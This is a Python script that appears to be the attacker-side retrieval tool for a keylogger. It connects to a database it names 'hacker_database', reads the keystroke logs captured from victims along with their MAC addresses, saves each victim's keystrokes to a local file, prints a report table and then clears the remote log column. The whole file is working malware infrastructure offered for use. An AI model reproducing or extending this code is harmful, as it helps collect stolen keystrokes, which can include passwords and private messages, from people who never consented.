# !/usr/bin/python

from colors import COLORS
from subprocess import call
from mysql.connector import connect
from terminaltables import AsciiTable


colors = COLORS()


def read_credentials(file_name):
    """
    :param file_name: this is the name of the file contains credentials
    :return: this function will return credentials
    """
    with open(file_name, 'r') as data_file:
        # start reading line by line
        data_line = data_file.read()
        data_line = data_line.split('\n')

        # create an empty dictionary to save data
        credentials = {}

        for item in data_line:
            try:
                item = item.split('=')
                credentials[item[0]] = item[1]
            except IndexError:
                pass

        return credentials


def read_online_keys():
    try:
        db_credentials = read_credentials(r'data/database_credentials.txt')

        try:

            hacker_database = connect(
                host=db_credentials['Server'],
                user=db_credentials['Username'],
                passwd=db_credentials['Password'],
                database=db_credentials['Database'],
                port=db_credentials['Port']
            )

            # reading the data base
            my_cursor = hacker_database.cursor()
            command = "SELECT * FROM `key_logs`"
            my_cursor.execute(command)
            data = my_cursor.fetchall()

            report = extract_write_data(data)
            heading = ['P_ID', 'MAC_ADDR', 'LOG stat', 'Process stat']

            draw_table(heading, report)

            # clear the data base
            command = "UPDATE `key_logs` SET `keys` = ''"
            my_cursor.execute(command)

            print(colors.Green + '\n[+]Database cleared\n\n' + colors.RESET)

            hacker_database.commit()

        except Exception as e:
            print(colors.Red + '[-]Error occurred while connecting to the database')
            print(colors.Red + '[-]' + e + colors.RESET)
            exit(0)

    except:
        print(colors.Red + '[-]Error reading credentials' + colors.RESET)
        exit(0)


def extract_write_data(data_list):
    try:
        call('mkdir keylogs', shell=True)
    except:
        pass

    print('\n' + colors.Cyan + '[+]Directory keylogs created')
    print(colors.Cyan + '[+]Processing data' + colors.RESET)

    # crete a empty list to append process report
    extract_report = []

    for row in data_list:

        p_id = row[0]
        mac_address = row[1]
        one_row_report = [p_id, mac_address]

        try:
            log = row[2]
            if len(log) > 0:
                one_row_report.append(colors.Green + 'LOGGED' + colors.RESET)
                with open(f'keylogs/p_id_{p_id}.txt', 'a') as log_file:
                    log_file.write('\n\n\n\n\n')
                    log_file.write(log)

            else:
                one_row_report.append(colors.Red + 'NO LOG' + colors.RESET)

            one_row_report.append('Completed')

        except:
            while len(one_row_report) < 3:
                one_row_report.append('')
            one_row_report.append('Error')

        extract_report.append(one_row_report)

    return extract_report


def draw_table(heading, data):
    print('\n\n' + colors.BOLD + colors.ULINE + "Report of Key logger data" + colors.RESET)

    real_data = [heading]
    real_data.extend(data)

    table = AsciiTable(real_data)
    print(table.table)


read_online_keys()
